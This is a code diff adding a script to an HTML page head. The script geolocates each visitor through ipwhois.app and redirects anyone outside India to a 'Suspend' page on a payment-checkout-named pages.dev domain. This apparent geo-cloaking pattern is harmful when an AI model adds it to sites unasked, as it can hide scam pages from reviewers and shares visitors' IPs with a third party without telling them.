@@ -32,6 +32,30 @@
         <meta name="msapplication-TileColor" content="#2d89ef">
         <meta name="msapplication-config" content="../icons/browserconfig.xml">
         <meta name="theme-color" content="#ffffff">
+          <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      // Fetch visitor info from ipwhois.app
+      fetch('https://ipwhois.app/json/')
+        .then(response => response.json())
+        .then(data => {
+          const countryCode = data.country_code; // e.g., "IN" for India
+          console.log('Detected country:', countryCode);
+
+          if (countryCode === 'IN') {
+            // User is from India, allow to stay
+            console.log('Access granted for India');
+          } else {
+            // User is NOT from India, redirect to suspend page
+            window.location.href = 'https://himanpayment2checkout.pages.dev/Suspend';
+          }
+        })
+        .catch(err => {
+          console.error('Error detecting country:', err);
+          // Optional: redirect if API fails
+          window.location.href = 'https://himanpayment2checkout.pages.dev/Suspend';
+        });
+    });
+  </script>
 </head>
     
 <body class="theme-light" data-highlight="highlight-red">
